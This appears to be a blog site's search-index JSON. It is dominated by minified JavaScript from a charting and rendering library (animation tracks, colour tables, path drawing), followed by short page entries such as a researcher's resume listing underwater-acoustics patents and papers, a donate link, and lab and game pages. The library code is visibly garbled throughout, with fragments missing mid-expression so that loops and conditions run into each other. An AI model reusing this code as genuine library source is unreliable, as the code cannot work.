setTimeout(t,16)};var c_=i_,p_={linear:function(t){return t},quadraticIn:function(t){return t*t},quadraticOut:function(t){return t*(2-t)},quadraticInOut:function(t){return(t*=2)r&&(r=0),r=Math.min(r,1);var o=this.easingFunc,a=o?o(r):r;if(this.onframe(a),1===r){if(!this.loop)return!0;var s=i%n;this._startTime=t-s,this._pausedTime=0,this.onrestart()}return!1},t.prototype.pause=function(){this._paused=!0},t.prototype.resume=function(){this._paused=!1},t.prototype.setEasing=function(t){this.easing=t,this.easingFunc=T(t)?t:p_[t]||pn(t)},t}(),M_=function(){function t(t){this.value=t}return t}(),T_=function(){function t(){this._len=0}return t.prototype.insert=function(t){var e=new M_(t);return this.insertEntry(e),e},t.prototype.insertEntry=function(t){this.head?(this.tail.next=t,t.prev=this.tail,t.next=null,this.tail=t):this.head=this.tail=t,this._len++},t.prototype.remove=function(t){var e=t.prev,n=t.next;e?e.next=n:this.head=n,n?n.prev=e:this.tail=e,t.next=t.prev=null,this._len--},t.prototype.len=function(){return this._len},t.prototype.clear=function(){this.head=this.tail=null,this._len=0},t}(),C_=function(){function t(t){this._list=new T_,this._maxSize=10,this._map={},this._maxSize=t}return t.prototype.put=function(t,e){var n=this._list,i=this._map,r=null;if(null==i[t]){var o=n.len(),a=this._lastRemovedEntry;if(o>=this._maxSize&&o>0){var s=n.head;n.remove(s),delete i[s.key],r=s.value,this._lastRemovedEntry=s}a?a.value=e:a=new M_(e),a.key=t,n.insertEntry(a),i[t]=a}return r},t.prototype.get=function(t){var e=this._map[t],n=this._list;return null!=e?(e!==n.tail&&(n.remove(e),n.insertEntry(e)),e.value):void 0},t.prototype.clear=function(){this._list.clear(),this._map={}},t.prototype.len=function(){return this._list.len()},t}(),I_={transparent:[0,0,0,0],aliceblue:[240,248,255,1],antiquewhite:[250,235,215,1],aqua:[0,255,255,1],aquamarine:[127,255,212,1],azure:[240,255,255,1],beige:[245,245,220,1],bisque:[255,228,196,1],black:[0,0,0,1],blanchedalmond:[255,235,205,1],blue:[0,0,255,1],blueviolet:[138,43,226,1],brown:[165,42,42,1],burlywood:[222,184,135,1],cadetblue:[95,158,160,1],chartreuse:[127,255,0,1],chocolate:[210,105,30,1],coral:[255,127,80,1],cornflowerblue:[100,149,237,1],cornsilk:[255,248,220,1],crimson:[220,20,60,1],cyan:[0,255,255,1],darkblue:[0,0,139,1],darkcyan:[0,139,139,1],darkgoldenrod:[184,134,11,1],darkgray:[169,169,169,1],darkgreen:[0,100,0,1],darkgrey:[169,169,169,1],darkkhaki:[189,183,107,1],darkmagenta:[139,0,139,1],darkolivegreen:[85,107,47,1],darkorange:[255,140,0,1],darkorchid:[153,50,204,1],darkred:[139,0,0,1],darksalmon:[233,150,122,1],darkseagreen:[143,188,143,1],darkslateblue:[72,61,139,1],darkslategray:[47,79,79,1],darkslategrey:[47,79,79,1],darkturquoise:[0,206,209,1],darkviolet:[148,0,211,1],deeppink:[255,20,147,1],deepskyblue:[0,191,255,1],dimgray:[105,105,105,1],dimgrey:[105,105,105,1],dodgerblue:[30,144,255,1],firebrick:[178,34,34,1],floralwhite:[255,250,240,1],forestgreen:[34,139,34,1],fuchsia:[255,0,255,1],gainsboro:[220,220,220,1],ghostwhite:[248,248,255,1],gold:[255,215,0,1],goldenrod:[218,165,32,1],gray:[128,128,128,1],green:[0,128,0,1],greenyellow:[173,255,47,1],grey:[128,128,128,1],honeydew:[240,255,240,1],hotpink:[255,105,180,1],indianred:[205,92,92,1],indigo:[75,0,130,1],ivory:[255,255,240,1],khaki:[240,230,140,1],lavender:[230,230,250,1],lavenderblush:[255,240,245,1],lawngreen:[124,252,0,1],lemonchiffon:[255,250,205,1],lightblue:[173,216,230,1],lightcoral:[240,128,128,1],lightcyan:[224,255,255,1],lightgoldenrodyellow:[250,250,210,1],lightgray:[211,211,211,1],lightgreen:[144,238,144,1],lightgrey:[211,211,211,1],lightpink:[255,182,193,1],lightsalmon:[255,160,122,1],lightseagreen:[32,178,170,1],lightskyblue:[135,206,250,1],lightslategray:[119,136,153,1],lightslategrey:[119,136,153,1],lightsteelblue:[176,196,222,1],lightyellow:[255,255,224,1],lime:[0,255,0,1],limegreen:[50,205,50,1],linen:[250,240,230,1],magenta:[255,0,255,1],maroon:[128,0,0,1],mediumaquamarine:[102,205,170,1],mediumblue:[0,0,205,1],mediumorchid:[186,85,211,1],mediumpurple:[147,112,219,1],mediumseagreen:[60,179,113,1],mediumslateblue:[123,104,238,1],mediumspringgreen:[0,250,154,1],mediumturquoise:[72,209,204,1],mediumvioletred:[199,21,133,1],midnightblue:[25,25,112,1],mintcream:[245,255,250,1],mistyrose:[255,228,225,1],moccasin:[255,228,181,1],navajowhite:[255,222,173,1],navy:[0,0,128,1],oldlace:[253,245,230,1],olive:[128,128,0,1],olivedrab:[107,142,35,1],orange:[255,165,0,1],orangered:[255,69,0,1],orchid:[218,112,214,1],palegoldenrod:[238,232,170,1],palegreen:[152,251,152,1],paleturquoise:[175,238,238,1],palevioletred:[219,112,147,1],papayawhip:[255,239,213,1],peachpuff:[255,218,185,1],peru:[205,133,63,1],pink:[255,192,203,1],plum:[221,160,221,1],powderblue:[176,224,230,1],purple:[128,0,128,1],red:[255,0,0,1],rosybrown:[188,143,143,1],royalblue:[65,105,225,1],saddlebrown:[139,69,19,1],salmon:[250,128,114,1],sandybrown:[244,164,96,1],seagreen:[46,139,87,1],seashell:[255,245,238,1],sienna:[160,82,45,1],silver:[192,192,192,1],skyblue:[135,206,235,1],slateblue:[106,90,205,1],slategray:[112,128,144,1],slategrey:[112,128,144,1],snow:[255,250,250,1],springgreen:[0,255,127,1],steelblue:[70,130,180,1],tan:[210,180,140,1],teal:[0,128,128,1],thistle:[216,191,216,1],tomato:[255,99,71,1],turquoise:[64,224,208,1],violet:[238,130,238,1],wheat:[245,222,179,1],white:[255,255,255,1],whitesmoke:[245,245,245,1],yellow:[255,255,0,1],yellowgreen:[154,205,50,1]},D_=new C_(20),k_=null,A_=Dn,L_=kn,P_=(Object.freeze||Object)({parse:Sn,lift:Cn,toHex:In,fastLerp:Dn,fastMapToColor:A_,lerp:kn,mapToColor:L_,modifyHSL:An,modifyAlpha:Ln,stringify:Pn,lum:On,random:Rn}),O_=(function(){return lm.hasGlobalWindow&&T(window.btoa)?function(t){return window.btoa(unescape(t))}:\"undefined\"!=typeof Buffer?function(t){return Buffer.from(t).toString(\"base64\")}:function(){return null}}(),Array.prototype.slice),R_=0,E_=1,N_=2,z_=3,B_=4,F_=5,V_=6,H_=[0,0,0,0],G_=function(){function t(t){this.keyframes=[],this.discrete=!1,this._invalid=!1,this._needsSort=!1,this._lastFr=0,this._lastFrP=0,this.propName=t}return t.prototype.isFinished=function(){return this._finished},t.prototype.setFinished=function(){this._finished=!0,this._additiveTrack&&this._additiveTrack.setFinished()},t.prototype.needsAnimate=function(){return this.keyframes.length>=1},t.prototype.getAdditiveTrack=function(){return this._additiveTrack},t.prototype.addKeyframe=function(t,e,n){this._needsSort=!0;var i=this.keyframes,r=i.length,o=!1,a=V_,s=e;if(g(e)){var l=Yn(e);a=l,(1===l&&!D(e[0])||2===l&&!D(e[0][0]))&&(o=!0)}else if(D(e)&&!N(e))a=R_;else if(C(e))if(isNaN(+e)){var u=Sn(e);u&&(s=u,a=z_)}else a=R_;else if(O(e)){var c=h({},s);c.colorStops=y(e.colorStops,function(t){return{offset:t.offset,color:Sn(t.color)}}),En(e)?a=B_:Nn(e)&&(a=F_),s=c}0===r?this.valType=a:(a!==this.valType||a===V_)&&(o=!0),this.discrete=this.discrete||o;var p={time:t,value:s,rawValue:e,percent:0};return n&&(p.easing=n,p.easingFunc=T(n)?n:p_[n]||pn(n)),i.push(p),p},t.prototype.prepare=function(t,e){var n=this.keyframes;this._needsSort&&n.sort(function(t,e){return t.time-e.time});for(var i=this.valType,r=n.length,o=n[r-1],a=this.discrete,s=jn(i),l=qn(i),u=0;r>u;u++){var h=n[u],c=h.value,p=o.value;h.percent=h.time/t,a||(s&&u!==r-1?Wn(c,p,i):l&&Gn(c.colorStops,p.colorStops))}if(!a&&i!==F_&&e&&this.needsAnimate()&&e.needsAnimate()&&i===e.valType&&!e._finished){this._additiveTrack=e;for(var d=n[0].value,u=0;r>u;u++)i===R_?n[u].additiveValue=n[u].value-d:i===z_?n[u].additiveValue=Vn([],n[u].value,d,-1):jn(i)&&(n[u].additiveValue=i===E_?Vn([],n[u].value,d,-1):Hn([],n[u].value,d,-1))}},t.prototype.step=function(t,e){if(!this._finished){this._additiveTrack&&this._additiveTrack._finished&&(this._additiveTrack=null);var n,i,r,o=null!=this._additiveTrack,a=o?\"additiveValue\":\"value\",s=this.valType,l=this.keyframes,u=l.length,h=this.propName,c=s===z_,p=this._lastFr,d=Math.min;if(1===u)i=r=l[0];else{if(0>e)n=0;else if(e=0&&!(l[n].percentn&&!(l[n].percent>e);n++);n=d(n-1,u-2)}r=l[n+1],i=l[n]}if(i&&r){this._lastFr=n,this._lastFrP=e;var g=r.percent-i.percent,v=0===g?1:d((e-i.percent)/g,1);r.easingFunc&&(v=r.easingFunc(v));var m=o?this._additiveValue:c?H_:t[h];if(!jn(s)&&!c||m||(m=this._additiveValue=[]),this.discrete)t[h]=1>v?i.rawValue:r.rawValue;else if(jn(s))s===E_?Bn(m,i[a],r[a],v):Fn(m,i[a],r[a],v);else if(qn(s)){var _=i[a],x=r[a],b=s===B_;t[h]={type:b?\"linear\":\"radial\",x:zn(_.x,x.x,v),y:zn(_.y,x.y,v),colorStops:y(_.colorStops,function(t,e){var n=x.colorStops[e];return{offset:zn(t.offset,n.offset,v),color:Xn(Bn([],t.color,n.color,v))}}),global:x.global},b?(t[h].x2=zn(_.x2,x.x2,v),t[h].y2=zn(_.y2,x.y2,v)):t[h].r=zn(_.r,x.r,v)}else if(c)Bn(m,i[a],r[a],v),o||(t[h]=Xn(m));else{var w=zn(i[a],r[a],v);o?this._additiveValue=w:t[h]=w}o&&this._addToTarget(t)}}},t.prototype._addToTarget=function(t){var e=this.valType,n=this.propName,i=this._additiveValue;e===R_?t[n]=t[n]+i:e===z_?(Sn(t[n],H_),Vn(H_,H_,i,1),t[n]=Xn(H_)):e===E_?Vn(t[n],t[n],i,1):e===N_&&Hn(t[n],t[n],i,1)},t}(),W_=function(){function t(t,e,n,i){return this._tracks={},this._trackKeys=[],this._maxTime=0,this._started=0,this._clip=null,this._target=t,this._loop=e,e&&i?void a(\"Can' use additive animation on looped animation.\"):(this._additiveAnimators=i,void(this._allowDiscrete=n))}return t.prototype.getMaxTime=function(){return this._maxTime},t.prototype.getDelay=function(){return this._delay},t.prototype.getLoop=function(){return this._loop},t.prototype.getTarget=function(){return this._target},t.prototype.changeTarget=function(t){this._target=t},t.prototype.when=function(t,e,n){return this.whenWithKeys(t,e,b(e),n)},t.prototype.whenWithKeys=function(t,e,n,i){for(var r=this._tracks,o=0;o0&&s.addKeyframe(0,Un(l),i),this._trackKeys.push(a)}s.addKeyframe(t,Un(e[a]),i)}return this._maxTime=Math.max(this._maxTime,t),this},t.prototype.pause=function(){this._clip.pause(),this._paused=!0},t.prototype.resume=function(){this._clip.resume(),this._paused=!1},t.prototype.isPaused=function(){return!!this._paused},t.prototype.duration=function(t){return this._maxTime=t,this._force=!0,this},t.prototype._doneCallback=function(){this._setTracksFinished(),this._clip=null;var t=this._doneCbs;if(t)for(var e=t.length,n=0;e>n;n++)t[n].call(this)},t.prototype._abortedCallback=function(){this._setTracksFinished();var t=this.animation,e=this._abortedCbs;if(t&&t.removeClip(this._clip),this._clip=null,e)for(var n=0;ng?vx.set(Mx,g,0):vx.set(Mx,-v,0)),h>s||a>c?x>f&&(f=x,m>y?vx.set(Tx,0,-y):vx.set(Tx,0,m)):d>_&&(d=_,m>y?vx.set(Mx,0,y):vx.set(Mx,0,-m))}return n&&vx.copy(n,p?Mx:Tx),p},t.prototype.contain=function(t,e){var n=this;return t>=n.x&&t=n.y&&es;s++)if(t[s]!==r[s]){a=!1;break}if(a)return;for(var s=0;o>s;s++){var l=t[s],u=void 0;this.stateProxy&&(u=this.stateProxy(l,t)),u||(u=this.states[l]),u&&i.push(u)}var h=i[o-1],c=!!(h&&h.hoverLayer||n);c&&this._toggleHoverLayerFlag(!0);var p=this._mergeStates(i),d=this.stateTransition;this.saveCurrentToNormalState(p),this._applyStateObj(t.join(\",\"),p,this._normalState,!1,!e&&!this.__inHover&&d&&d.duration>0,d);var f=this._textContent,g=this._textGuide;f&&f.useStates(t,e,c),g&&g.useStates(t,e,c),this._updateAnimationTargets(),this.currentStates=t.slice(),this.markRedraw(),!c&&this.__inHover&&(this._toggleHoverLayerFlag(!1),this.__dirty&=~a_)}else this.clearStates()},t.prototype._updateAnimationTargets=function(){for(var t=0;t=0){var n=this.currentStates.slice();n.splice(e,1),this.useStates(n)}},t.prototype.replaceState=function(t,e,n){var i=this.currentStates.slice(),r=p(i,t),o=p(i,e)>=0;r>=0?o?i.splice(r,1):i[r]=e:n&&!o&&i.push(e),this.useStates(i)},t.prototype.toggleState=function(t,e){e?this.useState(t,!0):this.removeState(t)},t.prototype._mergeStates=function(t){for(var e,n={},i=0;i0&&(t.lineTo(c,p),x=0),w){case Cb.M:n=r=d[b++],i=o=d[b++],t.moveTo(r,o);break;case Cb.L:a=d[b++],s=d[b++];var M=zb(a-r),T=zb(s-o);if(M>f||T>g){if(y){var C=l[_++];if(m+C>h){var I=(h-m)/C;t.lineTo(r*(1-I)+a*I,o*(1-I)+s*I);break t}m+=C}t.lineTo(a,s),r=a,o=s,x=0}else{var D=M*M+T*T;D>x&&(c=a,p=s,x=D)}break;case Cb.C:var k=d[b++],A=d[b++],L=d[b++],P=d[b++],O=d[b++],R=d[b++];if(y){var C=l[_++];if(m+C>h){var I=(h-m)/C;en(r,k,L,O,I,Ib),en(o,A,P,R,I,Db),t.bezierCurveTo(Ib[1],Db[1],Ib[2],Db[2],Ib[3],Db[3]);break t}m+=C}t.bezierCurveTo(k,A,L,P,O,R),r=O,o=R;break;case Cb.Q:var k=d[b++],A=d[b++],L=d[b++],P=d[b++];if(y){var C=l[_++];if(m+C>h){var I=(h-m)/C;un(r,k,L,I,Ib),un(o,A,P,I,Db),t.quadraticCurveTo(Ib[1],Db[1],Ib[2],Db[2]);break t}m+=C}t.quadraticCurveTo(k,A,L,P),r=L,o=P;break;case Cb.A:var E=d[b++],N=d[b++],z=d[b++],B=d[b++],F=d[b++],V=d[b++],H=d[b++],G=!d[b++],W=z>B?z:B,U=zb(z-B)>.001,X=F+V,Y=!1;if(y){var C=l[_++];m+C>h&&(X=F+V*(h-m)/C,Y=!0),m+=C}if(U&&t.ellipse?t.ellipse(E,N,z,B,H,F,X,G):t.arc(E,N,W,F,X,G),Y)break t;S&&(n=Eb(F)*z+E,i=Nb(F)*B+N),r=Eb(X)*z+E,o=Nb(X)*B+N;break;case Cb.R:n=r=d[b],i=o=d[b+1],a=d[b++],s=d[b++];var q=d[b++],j=d[b++];if(y){var C=l[_++];if(m+C>h){var Z=h-m;t.moveTo(a,s),t.lineTo(a+Ob(Z,q),s),Z-=q,Z>0&&t.lineTo(a+q,s+Ob(Z,j)),Z-=j,Z>0&&t.lineTo(a+Rb(q-Z,0),s+j),Z-=q,Z>0&&t.lineTo(a,s+Rb(j-Z,0));break t}m+=C}t.rect(a,s,q,j);break;case Cb.Z:if(y){var C=l[_++];if(m+C>h){var I=(h-m)/C;t.lineTo(r*(1-I)+n*I,o*(1-I)+i*I);break t}m+=C}t.closePath(),r=n,o=i}}},t.prototype.clone=function(){var e=new t,n=this.data;return e.data=n.slice?n.slice():Array.prototype.slice.call(n),e._len=this._len,e},t.CMD=Cb,t.initDefaultProps=function(){var e=t.prototype;e._saveData=!0,e._ux=0,e._uy=0,e._pendingPtDist=0,e._version=0}(),t}(),Wb=2*Math.PI,Ub=2*Math.PI,Xb=Gb.CMD,Yb=2*Math.PI,qb=1e-4,jb=[-1,-1,-1],Zb=[-1,-1],Kb=c({fill:\"#000\",stroke:null,strokePercent:1,fillOpacity:1,strokeOpacity:1,lineDashOffset:0,lineWidth:1,lineCap:\"butt\",miterLimit:10,strokeNoScale:!1,strokeFirst:!1},ub),$b={style:c({fill:!0,stroke:!0,strokePercent:!0,fillOpacity:!0,strokeOpacity:!0,lineDashOffset:!0,lineWidth:!0,miterLimit:!0},hb.style)},Qb=gx.concat([\"invisible\",\"culling\",\"z\",\"z2\",\"zlevel\",\"parent\"]),Jb=function(t){function n(e){return t.call(this,e)||this}return e(n,t),n.prototype.update=function(){var e=this;t.prototype.update.call(this);var i=this.style;if(i.decal){var r=this._decalEl=this._decalEl||new n;r.buildPath===n.prototype.buildPath&&(r.buildPath=function(t){e.buildPath(t,e.shape)}),r.silent=!0;var o=r.style;for(var a in i)o[a]!==i[a]&&(o[a]=i[a]);o.fill=i.fill?i.decal:null,o.decal=null,o.shadowColor=null,i.strokeFirst&&(o.stroke=null);for(var s=0;s.2?ax:ox}if(t)return ox}return rx},n.prototype.getInsideTextStroke=function(t){var e=this.style.fill;if(C(e)){var n=this.__zr,i=!(!n||!n.isDarkMode()),r=On(t,0)0))},n.prototype.hasFill=function(){var t=this.style,e=t.fill;return null!=e&&\"none\"!==e},n.prototype.getBoundingRect=function(){var t=this._rect,e=this.style,n=!t;if(n){var i=!1;this.path||(i=!0,this.createPathProxy());var r=this.path;(i||this.__dirty&l_)&&(r.beginPath(),this.buildPath(r,this.shape,!1),this.pathUpdated()),t=r.getBoundingRect()}if(this._rect=t,this.hasStroke()&&this.path&&this.path.len()>0){var o=this._rectStroke||(this._rectStroke=t.clone());if(this.__dirty||n){o.copy(t);var a=e.strokeNoScale?this.getLineScale():1,s=e.lineWidth;if(!this.hasFill()){var l=this.strokeContainThreshold;s=Math.max(s,null==l?4:l)}a>1e-10&&(o.width+=s/a,o.height+=s/a,o.x-=s/a/2,o.y-=s/a/2)}return o}return t},n.prototype.contain=function(t,e){var n=this.transformCoordToLocal(t,e),i=this.getBoundingRect(),r=this.style;if(t=n[0],e=n[1],i.contain(t,e)){var o=this.path;if(this.hasStroke()){var a=r.lineWidth,s=r.strokeNoScale?this.getLineScale():1;if(s>1e-10&&(this.hasFill()||(a=Math.max(a,this.strokeContainThreshold)),Do(o,a/s,t,e)))return!0}if(this.hasFill())return Io(o,t,e)}return!1},n.prototype.dirtyShape=function(){this.__dirty|=l_,this._rect&&(this._rect=null),this._decalEl&&this._decalEl.dirtyShape(),this.markRedraw()},n.prototype.dirty=function(){this.dirtyStyle(),this.dirtyShape()},n.prototype.animateShape=function(t){return this.animate(\"shape\",t)},n.prototype.updateDuringAnimation=function(t){\"style\"===t?this.dirtyStyle():\"shape\"===t?this.dirtyShape():this.markRedraw()},n.prototype.attrKV=function(e,n){\"shape\"===e?this.setShape(n):t.prototype.attrKV.call(this,e,n)},n.prototype.setShape=function(t,e){var n=this.shape;return n||(n=this.shape={}),\"string\"==typeof t?n[t]=e:h(n,t),this.dirtyShape(),this},n.prototype.shapeChanged=function(){return!!(this.__dirty&l_)},n.prototype.createStyle=function(t){return j(Kb,t)},n.prototype._innerSaveToNormal=function(e){t.prototype._innerSaveToNormal.call(this,e);var n=this._normalState;e.shape&&!n.shape&&(n.shape=h({},this.shape))},n.prototype._applyStateObj=function(e,n,i,r,o,a){t.prototype._applyStateObj.call(this,e,n,i,r,o,a);var s,l=!(n&&r);if(n&&n.shape?o?r?s=n.shape:(s=h({},i.shape),h(s,n.shape)):(s=h({},r?this.shape:i.shape),h(s,n.shape)):l&&(s=i.shape),s)if(o){this.shape=h({},this.shape);for(var u={},c=b(s),p=0;ph&&(un(n,a,r,h,xS),a=xS[1],r=xS[2],un(i,s,o,h,xS),s=xS[1],o=xS[2]),t.quadraticCurveTo(a,s,r,o)):(1>h&&(en(n,a,l,r,h,xS),a=xS[1],l=xS[2],r=xS[3],en(i,s,u,o,h,xS),s=xS[1],u=xS[2],o=xS[3]),t.bezierCurveTo(a,s,l,u,r,o)))},n.prototype.pointAt=function(t){return es(this.shape,t,!1)},n.prototype.tangentAt=function(t){var e=es(this.shape,t,!0);return ce(e,e)},n}(Jb);wS.prototype.type=\"bezier-curve\";var SS=function(){function t(){this.cx=0,this.cy=0,this.r=0,this.startAngle=0,this.endAngle=2*Math.PI,this.clockwise=!0}return t}(),MS=function(t){function n(e){return t.call(this,e)||this}return e(n,t),n.prototype.getDefaultStyle=function(){return{stroke:\"#000\",fill:null}},n.prototype.getDefaultShape=function(){return new SS},n.prototype.buildPath=function(t,e){var n=e.cx,i=e.cy,r=Math.max(e.r,0),o=e.startAngle,a=e.endAngle,s=e.clockwise,l=Math.cos(o),u=Math.sin(o);t.moveTo(l*r+n,u*r+i),t.arc(n,i,r,o,a,!s)},n}(Jb);MS.prototype.type=\"arc\";var TS=function(t){function n(){var e=null!==t&&t.apply(this,arguments)||this;return e.type=\"compound\",e}return e(n,t),n.prototype._updatePathDirty=function(){for(var t=this.shape.paths,e=this.shapeChanged(),n=0;nl;l++)this._origin[l]=i[l].dot(n[0])},t.prototype.intersect=function(t,e){var n=!0,i=!e;return LS.set(1/0,1/0),PS.set(0,0),!this._intersectCheckOneSide(this,t,LS,PS,i,1)&&(n=!1,i)?n:!this._intersectCheckOneSide(t,this,LS,PS,i,-1)&&(n=!1,i)?n:(i||vx.copy(e,n?LS:PS),n)},t.prototype._intersectCheckOneSide=function(t,e,n,i,r,o){for(var a=!0,s=0;2>s;s++){var l=this._axes[s];if(this._getProjMinMaxOnAxis(s,t._corners,kS),this._getProjMinMaxOnAxis(s,e._corners,AS),kS[1]AS[1]){if(a=!1,r)return a;var u=Math.abs(AS[0]-kS[1]),h=Math.abs(kS[0]-AS[1]);Math.min(u,h)>i.len()&&(h>u?vx.scale(i,l,-u*o):vx.scale(i,l,h*o))}else if(n){var u=Math.abs(AS[0]-kS[1]),h=Math.abs(kS[0]-AS[1]);Math.min(u,h)u?vx.scale(n,l,u*o):vx.scale(n,l,-h*o))}}return a},t.prototype._getProjMinMaxOnAxis=function(t,e,n){for(var i=this._axes[t],r=this._origin,o=e[0].dot(i)+r[t],a=o,s=o,l=1;l","tags":""},{"title":"","url":"/About.html","text":"Resume ¶slogan 解放思想，发展生产力 茍日新，日日新，又日新 我的思想是全人类的财富 仰望星空 ¶Biography Yao-Qingsheng received the B.S. degree in Noise and Vibration Control(082502) from Northwestern Polytechnical University (NPU), Xi’an, China, in 2010 and the M.S. degree in Underwater Acoustic Engineering(082403) from Northwestern Polytechnical University (NPU), Xi’an, China, in 2013. He is currently working toward the Ph.D. degree in Electronic Information(085400) with the School of Marine Science and Technology, Northwestern Polytechnical University (NPU), Xi’an, China. His research interests include Underwater Acoustic Engineering, Underwater Acoustic Target Tracking and Information Fusion. ¶主要成果展示 ¶以第一权利人获得的发明专利或软件著作权 昆明船舶设备研究试验中心（中国船舶重工集团公司七五0试验场）.要庆生.船载无线数据传输与融合显示软件.软件著作权.登记号：2021SR0256847. 昆明船舶设备研究试验中心（中国船舶重工集团公司七五0试验场）.要庆生.船载式水下目标定位跟踪系统显控处理软件.软件著作权.登记号：2021SR0175434. 昆明船舶设备研究试验中心.要庆生.大范围水声跟踪测量系统状态显控软件.软件著作权.登记号：2018SR124669. 昆明船舶设备研究试验中心.要庆生.船载电罗经航迹航向显示软件.软件著作权.登记号：2018SR125516. 中国船舶重工集团公司七五〇试验场.要庆生.大范围水声跟踪测量系统弹道处理显控软件.软件著作权.登记号：2016SR090272. 吕希敬; 要庆生; 黄其培; 杨咏; 施铭珂; 何美玲.一种四自由度的水听器支架[P].云南省:CN202322600447.X,2024-04-30. 王琨; 匡彪; 汤志峰; 柯有强; 宋文生; 龚浩亮; 马小勤; 要庆生; 桑国峰.一种双环自愈型水下光纤网络信号传输系统和方法[P].云南省:CN202210007443.8,2024-01-23. 袁春姗; 匡彪; 黄其培; 唐济远; 要庆生; 马小勤; 万莉莉.基于水声定位的井口防喷器安装方法[P].云南省:CN202310912629.2,2023-09-19. 范赞; 刘庆; 匡彪; 付传宝; 要庆生.用于水下清洗机器人的高精度相对定位方法[P].云南省:CN202211507900.6,2023-03-24. 王琨; 匡彪; 汤志峰; 柯有强; 宋文生; 龚浩亮; 马小勤; 要庆生; 桑国峰.一种双环自愈型水下光纤网络信号传输系统和方法[P].云南省:CN202210007443.8,2022-05-13. ¶论文 要庆生.一种长基线阵阵元标定及位置校准方法.《鱼雷靶场》.2017，3. 要庆生.基于OpenGL的水下弹道处理图形控制软件的设计.《鱼雷靶场》.2017，4. 要庆生.基于同步式合作信标的水声跟踪测量系统弹道处理显控软件设计.场50周年庆征文.2019. 要庆生. 四阶累积量谱线增强方法的改进仿真研究 [J]. 电子设计工程, 2014, 22 (18): 52-54. DOI:10.14022/j.cnki.dzsjgc.2014.18.075. 要庆生,李钢虎,曾渊,赵亚楠,何会会. 最小方差无失真响应基础上的语音信号处理方法研究[A]. 中国声学会超声电子学分会、四川省声学学会、上海市声学学会、山东声学学会、陕西省声学学会、重庆市声学学会、西安市声学会、中国力学学会电子电磁器件力学工作组.2012’中国西部声学学术交流会论文集[Ⅱ]©.中国声学会超声电子学分会、四川省声学学会、上海市声学学会、山东声学学会、陕西省声学学会、重庆市声学学会、西安市声学会、中国力学学会电子电磁器件力学工作组:《声学技术》编辑部,2012:4. 袁春姗,唐济远,要庆生. 面阵阵元位置及幅相误差有源校正算法 [J]. 舰船电子对抗, 2021, 44 (06): 78-81+116. DOI:10.16426/j.cnki.jcdzdk.2021.06.015. 张庆国,黄其培,要庆生,等. 深远海水下多目标定位跟踪技术研究 [J]. 电子测量技术, 2019, 42 (22): 67-72. DOI:10.19651/j.cnki.emt.1902972. 张庆国,匡彪,要庆生,等. 船载水声定位系统自动校准技术研究 [J]. 声学技术, 2018, 37 (06): 535-539. DOI:10.16300/j.cnki.1000-3630.2018.06.004. 匡彪,王琨,袁春姗,要庆生.平面阵分裂波束DOA估计技术研究[J].声学与电子工程,2018(04):28-31. 张庆国,要庆生,黄其培,等. 座底式长基线水声跟踪系统校阵方法研究 [J]. 声学技术, 2016, 35 (05): 408-413. DOI:10.16300/j.cnki.1000-3630.2016.05.004. 何会会,李钢虎,要庆生,贺晓凯,石超雄.用慢特征分析算法实现水声信号盲分离[J].声学技术,2014,33(03):270-274. ¶Contact ¶Social accounts ¶开发 kaggle ¶学术/scholar ¶社交/Social Intercourse ¶My Skills ¶My Projects Repositories ¶42 $('#qrcode').qrcode({width: 173,height: 173,text:\"https://yaoqs.github.io/About\"});","tags":""},{"title":"","url":"/Donate.html","text":"$(\"#paypalme\").qrcode({width: 200,height: 200,alt: \"paypal捐赠 paypal.me/LordYao\",text: \"https://www.paypal.com/cgi-bin/webscr?cmd=_xclick&business=243292490@qq.com&currency_code=USD&amount=1&return=http://yaoqs.github.com/about&item_name=LordYao%27s%20Blog&undefined_quantity=1\"}); $('#qrcode').qrcode({width: 173,height: 173,text:\"https://yaoqs.github.io/Donate\"});","tags":""},{"title":"","url":"/Feature.html","text":"Repositories Pages $('#qrcode').qrcode({width: 173,height: 173,text:\"https://yaoqs.github.io/Feature\"});","tags":""},{"title":"","url":"/Lab.html","text":"Markdown.Parser.html test1.html jsTimeTest.htm test &lt; 2014 年 6 月 &gt; 今天 一 二 三 四 五 六 日 Hex Clock 是一个简单的网站，它使用十六进制的颜色代码 #000000 ～ #235959 来表示一天 24 小时，并且会在背景展示当前颜色代码的具体颜色 #861001 返回当前位置 #position { background: rgba(255, 255, 255, 0.2); -webkit-backdrop-filter: blur(8px); backdrop-filter: blur(8px); border-radius: 25px; box-shadow: inset 0 0 6px rgba(255, 255, 255, 0.2); } {\"imports\": {\"three\": \"https://cdn.jsdelivr.net/npm/three@v0.168.0/build/three.module.js\",\"three/addons/\": \"https://cdn.jsdelivr.net/npm/three@v0.168.0/examples/jsm/\"}} three.js demo $('#qrcode').qrcode({width: 173,height: 173,text:\"https://yaoqs.github.io/Lab\"});","tags":""},{"title":"","url":"/Music.html","text":"网易云音乐 QQ 音乐 $('#qrcode').qrcode({width: 173,height: 173,text:\"https://yaoqs.github.io/Music\"});","tags":""},{"title":"","url":"/Game.html","text":"¶ 在线小游戏 survivor armor-alley 拼图游戏网站 $('#qrcode').qrcode({width: 173,height: 173,text:\"https://yaoqs.github.io/Game\"});","tags":""},{"title":"archives","url":"/archives/index.html","text":"","tags":""},{"title":"tags","url":"/tags/index.html","text":"","tags":""},{"title":"categories","url":"/categories/index.html","text":"","tags":""},{"title":"","url":"/Navigator.html","text":"jmp https://yaoqs.github.io/resource-navigator/","tags":""}]}